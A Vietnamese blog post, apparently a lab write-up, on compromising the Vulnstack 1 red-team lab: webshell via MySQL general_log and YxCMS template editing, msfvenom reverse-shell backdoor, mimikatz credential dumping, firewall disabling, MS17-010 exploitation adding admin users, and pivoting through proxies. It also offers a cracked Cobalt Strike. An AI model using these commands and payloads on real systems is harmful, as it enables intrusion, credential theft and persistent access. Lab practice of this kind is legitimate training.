---
title: "[Vulnstack1] RCE via MySQL Log File, YxCMS, Pivoting Attack Internal Network"
date: 2021-12-20T18:17:00+07:00
draft: false
categories: [
    "Offensive Security",
    "Lab"
]
tags: [
    "Pivot", "Tunel", "Privilege Escalation"
]
---
### Introduce
Một ngày tình cờ vu vơ trên không gian mạng. Khi đang đọc blog của các pháp sư Trung Hoa tuổi trẻ tài cao. Tôi tình cờ  biết đến loạt bài lab red team thực chiến . Thấy phạm vi của lab khá rộng, attack từ mạng ngoài vào DMZ rồi vào internal network, domain, pivot, xoay vòng, … giống như mô hình mạng của một công ty, doanh nghiệp vậy. Nên tôi quyết định phải chinh phục hết toàn bộ series lab. Series này là vulnstack, gồm 7 phần từ 1-7. Được tạo bởi nhóm bảo mật Red Sun. Mỗi lab khoảng từ 10 – 25GB. Tải từ cloud của baidu. Tải thôi cũng mất nguyên mấy ngày.

Đây là bài viết đầu tiên cũng như là phần thứ nhất trong series gồm 7 phần của tôi. Đây cũng như nơi tôi ghi chép  cho những gì mình đã làm, đã học được từ bài lab. Nên tôi cũng sẽ cố gắng để đi rộng, tận dụng nhiều phương thức khác nhau để khai  thác với mục đích học tập là chính. Cũng hi vọng bạn đọc blog này cũng sẽ học được ít nhiều thông qua bài viết.
Thông tin chính thức của Vulnstack  1 tại đây: http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
### Setup
Mô hình lab

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/1.jpg)

Windows 7 ở ngoài gồm 2 card mạng

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/2.jpg)

2 máy win server 2003 và 2008 nằm bên trong sẽ chỉ gồm 1 card mạng. Từ ngoài muốn nhìn được phải thông qua windows 7

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/3.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/4.jpg)
Còn lại tất cả đều đặt theo mặc định

Password mặc định ban đầu là: **HONGRISEC@2019**. Password hết hạn nên sẽ đổi thành: **quac@1234**

IP máy win server 2003 : 192.168.52.141

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/5.jpg)

IP máy win server 2008 : 192.168.52.138

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/6.jpg)

IP máy win 7: 192.168.52.143 và 192.168.18.128 (NAT bên ngoài nhìn thấy)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/7.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/8.jpg)

Máy attacker: Kali Linux 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/9.jpg)

Khởi động ứng dụng vuln từ windows 7

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/10.jpg)

| Server      | IP |
| :---        |    :----:   |
| Windows 7   | Internal Network : 192.168.52.143 - NAT : 192.168.18.128|
| Windows Server 2003   | Internal Network  : 192.168.52.141        |
| Windows Server 2008   | Internal Network  : 192.168.52.138        |
### Foothold
#### Recon
Nmap scan Windows 7

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/11.jpg)

Open port 80, 3306

Truy cập vào ứng dụng web

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/12.jpg)

"PhpStudy is a program integration package for a PHP debugging environment. The package integrates the latest Apache+PHP+MySQL+phpMyAdmin+Zend Optimizer. It can be installed at one time and used without configuration. It is a very convenient and useful PHP debugging environment."

Sử dụng Dirsearch ta tìm được

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/13.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/14.jpg)

Thử với username/password mặc định: root/root -> đăng nhập thành công vào phpmyadmin

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/15.jpg)

Thử lấy shell bằng cách này nhưng không được vì MySQL server đang chạy option --secure-file-priv (The --secure-file-priv option is a system variable used by MySQL to limit the ability of the users to export or import data from the database server.)
https://sebhastian.com/mysql-fix-secure-file-priv-error/ 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/16.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/17.jpg)

secure_file_priv là NULL, nghĩa là Mysql không được phép export và import, do đó sẽ bị báo lỗi. Để thực hiện xuất câu lệnh thành công, bạn cần sửa đổi my.ini tệp trong thư mục Mysql và thêm vào [mysqld] secure_file_priv =""

Vậy ta sẽ đi tìm cách khác 
#### RCE via MySQL Log File
```
show variables like '%general%';
```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/18.jpg)

```
general_log  #đề cập đến trạng thái lưu log
general_log_file  #đề cập đến đường dẫn lưu trữ log
```

Vậy trong trường hợp này nếu general_log được là ON và thay đổi đường dẫn general_log_file và ghi cái thứ gì đó thú vị vào. Liệu chúng ta có thể getshell?
```
SET GLOBAL general_log = ‘on’;
SET GLOBAL general_log_file = “C:/phpStudy/www/backdoor0.php’;
SELECT ' <?php echo exec($_GET["cmd"]);?>';
```
Ta biết được đường dẫn qua đây

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/19.jpg)

Thử vào giao diện của Windows 7 để xem log được lưu lại:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/20.jpg)

Nice

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/21.jpg)

Thành công RCE. Để học được nhiều hơn tôi sẽ không dừng lại ở đây. Sẽ đi tìm những cách khác nữa
#### RCE via YxCMS
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/22.jpg)

Có một CSDL là newyscms. Vậy chắc chắn sẽ có 1 site chạy cms này. Tiếp tục đi tìm. Thử 1 vài lần thì tìm thấy nó tại

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/23.jpg)

Tìm thấy thông tin đăng nhập trang admin ở ngay trên trang chính. 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/24.jpg)

Đăng nhập thành công vào trang admin. Vậy mà ban đầu mình không nhìn thấy còn vào Database thêm user admin khác rồi đăng nhập

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/25.jpg)

Trong phần chỉnh sửa font-end template

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/26.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/27.jpg)

Chỉnh sửa index_index.php bằng mã php cho phép thực thi một OS command bằng lệnh gọi hàm system()

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/28.jpg)

Thành công RCE

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/29.jpg)

Tạo meterpreter shell php raw

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/30.jpg)

Sửa nó như thế này

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/31.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/32.jpg)

Chúng ta có shell meterpreter PHP ở đây. Nhưng hình nó không được ổn định cho lắm và php meterpreter shell bị hạn chế các module, chức năng. Vì vậy tôi sẽ sử dụng một meterpreter backdoor exe khác để đảm bảo độ ổn định:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.18.130 LPORT=443 -f exe -o rs_backdoor.exe
```
Tiến hành upload lên từ php meterpreter shell

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/33.jpg)

Thực thi bằng backdoor ban đầu:\
```http://192.168.18.128/yxcms/index.php?cmd=C:\phpStudy\WWW\yxcms\rs_backdoor.exe```
Và kết quả chúng ta có  được meterpreter shell xịn

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/34.jpg)

Dễ dàng đạt được đặc quyền cao nhất của windows: ```NT AUTHORITY\SYSTEM``` bằng metasploit với getsystem command\
Nếu các bạn muốn thực hành tay lỗi này để leo lang đặc quyền trong windows thì xem ở đây:

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/35.jpg)

NTLM hash

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/36.jpg)

Using mimikatz dump password user

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/37.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/38.jpg)

### Recon Internal Network

Một số lệnh thực hiện trên máy Windows 7 để lấy truy vấn thông tin và truy vấn thông tin domain:\
**Query command**
```
ipconfig /all
net config Workstation
systeminfo
nslookup god.org  : resolve domain name IP address
net config workstation : Query the current login domain and login user information
```
**Query information command**
```
wmic service list brief  : Query local service information
tasklist  : Query process
wmic process list brief  : Use wmic to query the process
wmic startup get command,caption  : View the startup process
schtasks/query/fo list/v  : View scheduled tasks
net statistics workstation  : View the host boot time
netstat -ano  : Query port list
wmic qfe get caption,description,hotfixid,installedon  : Query the patch installed on this machine
```
**View account information in the machine**
```
net user : View the list of local users
net localgroup administrators : Get local administrators
query user || qwinsta : Get online users
net session : List the sessions between the clients connected to the computer
net share : View the local share list
wmic share get name,path,status : Use wmic to query the local share list
```
**Turn off the firewall, defender**
```
netsh firewall set opmode disable : before windows server 2003
netsh advfirewall set allprofiles state off : after windows server 2003
net stop windefend : stop windefend
```
**Surviving hosts in the detection domain**
```
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr "TTL="
```
**Find information in the domain**
```
net view/domain : View domain
net group/domain : View the list of all users in the domain
net group "domain computers"/domain : View the list of domain member computers
group "domain computers" /domain : View other user in domain
net group "domain controllers" /domain : View domain controller
```
Và rất nhiều command khác. Sau khi có ít nhiều thông tin về server cũng như domain GOD.ORG .Giờ chúng ta sẽ scan, exploit mạng internal bên trong

**Các subnet của server**\
run get_local_subnets

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/39.jpg)

Như vậy đúng là có 2 subnet là dải 192.168.18.0/24 và 192.168.52.0/24. Dải 192.168.18.0/24 là dải  từ máy kali của chúng ta có thể nhìn thấy. 192.168.52.0/24 là dải mạng internal bên trong. Giờ hãy scan để xem các host có trong mạng internal

**scan host bên trong mạng internal sử dụng metasploit:**
```
run arp_scanner -r 192.168.52.0/24
```
như vậy ngoài 192.168.52.143 là IP của máy windows 7 thì bên trong chúng ta còn thấy 2 server khác nữa là 192.168.52.138 và 192.168.52.141

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/40.jpg)

**scan port sử dụng metasploit:**\
Muốn nhìn được mạng internal bên trong chúng ta phải add route cho metasploit
```
meterpreter > run post/multi/manage/autoroute CMD=add SUBNET=192.168.52.0 NETMASK=255.255.255.0 #add route
route add 192.168.52.0 255.255.255.0 1(session id) #other way add route
```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/41.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/42.jpg)

**Hãy xem cách khác ít lệ thuộc metasploit hơn bằng nnap: Kết hợp nmap + proxychains + socks5 proxy**\
tạo socks proxy với metasploit (lưu ý cũng cần add route mạng internal trước)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/43.jpg)

Thay đổi file config proxychains

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/44.jpg)

Nmap scan thành công mạng internal qua socks5 proxy được tạo bởi metasploit

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/45.jpg)

**Giờ chúng ta không muốn lệ thuộc vào metasploit. Cùng tạo socks proxy không dùng metasploit**\
ở đây mình sử dụng công cụ gost: https://github.com/ginuerzh/gost . Vì mình thích golang. Nên mình cũng thích sử dụng những công cụ được viết bằng go. Ngoài ra còn rất nhiều công cụ để tạo socks proxy khác: Chisel, …\
Download phiên bản cho windows, tải và chạy trên windows 7\
```
.\gost-windows-386.exe -L socks5://:9000
```
Lúc này ta đã có một socks5 proxy là máy windows 7, port 9000. 

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/46.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/47.jpg)

**Để trực quan hơn chúng ta có thể sử dụng cobalt strike**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/48.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/49.jpg)

Công cụ này là một trong những công cụ cực kì tuyệt vời và nhiều tính năng, được sử dụng rất phổ biến trong các cuộc tấn công APT. Nhưng cũng không dễ để tìm được 1 bản crack ổn định cũng như đầy đủ các tính năng. Các bạn có thể tự tìm hiểu thêm về nó nhé. Sau hàng chục bản, mình cũng tìm được 1 vài bản ổn định. Nếu muốn các bạn có thể liên hệ với mình nhé!

### Exploit Internal Network
#### 192.168.51.141
Scan qua proxychains

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/50.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/51.jpg)

Scan qua proxychains khá lâu. Có thể tải nmap về máy windows 7 rồi thực hiện scan hay cũng có thể remote desktop trực tiếp vào máy windows 7\
**Enable RDP, open port 3389**\
Using registry : If open, change 0 to 1
```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server/v fDenyTSConnections/t REG_DWORD/d 0/f 
```
Using wmic turns on 3389
```
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```
Using metasploit
```
meterpreter > run getgui -e
meterpreter > run post/windows/manage/enable_rdp
```
Attacker remote
```
root@kali# rdesktop 192.168.18.128:3389
```
Sử dụng account đã lấy được khi dump với mimikatz

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/52.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/53.jpg)
#### 192.168.51.138
Scan với nmap đã tải về máy Windows 7

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/54.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/55.jpg)

**Domain GOD.ORG**

| Server      | IP | Hostname |
| :---        |    :----:   |    :----:   |
| Windows 7   | Internal Network : 192.168.52.143 - NAT : 192.168.18.128| STU1 |
| Windows Server 2003   | Internal Network  : 192.168.52.141        | ROOT-TVI862UBEH |
| Windows Server 2008   | Internal Network  : 192.168.52.138        | OWA (domain controller) |

Sau khi scan thấy cả 2 máy chủ internal bên trong đều open port 445 nên ta sẽ thử một làn sóng quét Eternal Blue
Dường như cả 2 máy chủ internal đều bị ảnh hưởng

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/56.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/57.jpg)

Cũng có thể sử dụng nmap với script : --script=smb-vuln-ms17-010.nse

**Khai thác**

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/58.jpg)

Mặc dù vậy nhưng thử nhiều lần tôi vẫn không để lấy được shell của cả 2 máy chủ đó

Tại thời điểm này tôi vẫn cố gắng thử bằng nhiều cách. Tôi sử dụng một module khác cho phép chạy các command riêng lẻ tới máy chủ. Nó thành công. Thay vì lấy shell ta có thể tạo user mới trên hệ thống và RDP trực tiếp tới

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/59.jpg)

Đầu tiên tôi sẽ tạo một người dùng mới\
```
use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.52.141
set command net user quac quac@1234 /add
```
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/60.jpg)

Sau đó là add người dùng đó vào group admin
```
set command net localgroup administrators quac /add
```
Xác nhận người dùng đã được thêm vào
```
set command net localgroup administrators
```
Cuối cùng là mở port 3389 cho phép Remote Desktop
```
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```
Trước và sau khi open 3389

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/61.jpg)

Giờ đây tôi có thể remote tới máy chủ này thông qua proxychains

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/62.jpg)

Thành công remote tới máy chủ Windows server 2003 - ROOT-TVI862UBEH

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/63.jpg)

Thật lạ. Trên máy chủ domain controller 192.168.52.138. Tôi có thể thêm tài khoản, open port 3389 nhưng không thể remote desktop đến được:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/64.jpg)

Mở port thành công:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/65.jpg)

```
msf6 auxiliary(admin/smb/ms17_010_command) > set command netstat -anot
```

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/67.jpg)

Mặc dù 3389 LISTEN trên all interface nhưng từ bên ngoài scan thì port này ra kết quả là đang close

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/68.jpg)

Tôi nghĩ đến. Đây có thể là do tưởng lửa của máy chủ này. Ngay sau đó tôi đã thực hiện một lệnh để tắt tưởng lửa trên máy chủ này:
```
set command netsh advfirewall set allprofiles state off
```
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/69.jpg)

Thử lại nào:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/70.jpg)

Thành công! Lúc này ta có thể remote đến máy chủ:

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/71.jpg)

Giờ đây tôi đã thành công kiểm soát được cả 2 máy chủ trong internal.

Vì mục đích học tập nên tôi sẽ tiếp tục tìm hiểu thêm về domain này. Giả sử máy chủ domain controller không bị ảnh hưởng bởi lỗ hổn ms17_010. Khi khai thác thành công Windows 7. Ta đã tải lên mimikatz và lấy được thông tin của 1 tài khoản trong miền GOD.ORG

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/72.jpg)

Hãy xem tôi sử dụng tài khoản này để làm gì nhé:\
Đầu tiên. Tạo một IPC connect tới máy chủ Domain controller 192.168.52.138
```
net use \\192.168.52.138\c$ "quac@1234" /user:"administrator"
dir \\192.168.52.138\$
```
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/73.jpg)

Copy backdoor đã gen từ msfvenom
```
copy C:\phpStudy\WWW\yxcms\rs_backdoor.exe \\192.168.52.138\c$
```
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/74.jpg)

Thiết lập một Windows Task Scheduler chạy backdoor:
```
schtasks /create /tn "backdoor" /tr C:\rs_backdoor.exe /sc minute  /mo 1  /S 192.168.52.138 /RU System  /u administrator /p "quac@1234"
```
(/s computer :	Specifies the name or IP address of a remote computer (with or without backslashes). The default is the local computer.

Nó chưa thành công. Là vì máy chủ trong internal này không nhìn thấy được máy kali bên ngoài của tôi để kết nối tới. Phải chăng là do vậy? Nhưng khi tôi thử làm một điều khác:
```
schtasks /create /tn "backdoor" /tr notepad /sc minute  /mo 1  /S 192.168.52.138 /RU System  /u administrator /p "quac@1234"
```
Là bật notepad thì nó cũng không được thực thi. Cũng không thể xem các schtasks
![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/75.jpg)
:((
### Bloodhound
BloodHound is a data visualisation tool, meaning without any data is not at all useful. BloodHound is very good at visualising Active Directory object relationships and various permissions between those relationships. 

In order for BloodHound to do its magic, we need to enumerate a victim domain. The enumeration process produces a JSON file that describes various relationships and permissions between AD objects as mentioned earlier, which can then be imported to BloodHound. Once the resulting JSON file is ingested/imported to BloodHound, it will allow us to visually see the ways (if any) how Active Directory and its various objects can be (ab)used to elevate privileges, ideally to Domain Admin.

Tải về SharpHound.exe để thu thập thông tin

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/76.jpg)

![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/77.jpg)

Nhưng dường như nó không thể chạy trên windows 7, hoặc ít nhất là không thể chạy trên máy chủ này. Tôi sẽ sử dụng nó trong các bài vulnstack tới đây.

Đã học được:\
&ensp;&ensp;&ensp;&ensp;Kiên trì, tận dụng những thứ có sẵn để tấn công mục tiêu\
&ensp;&ensp;&ensp;&ensp;RCE qua MySQL log file\
&ensp;&ensp;&ensp;&ensp;Và nhiều điều hay ho khác

Cảm ơn vì đã đọc bài viết của tôi. Hi vọng các bạn sẽ học được gì từ đây. Tôi sẽ sớm ra Vulnstack 2 sau khi hoàn thành.

Tham khảo:

https://blog.csdn.net/weixin_39190897/article/details/99108699 
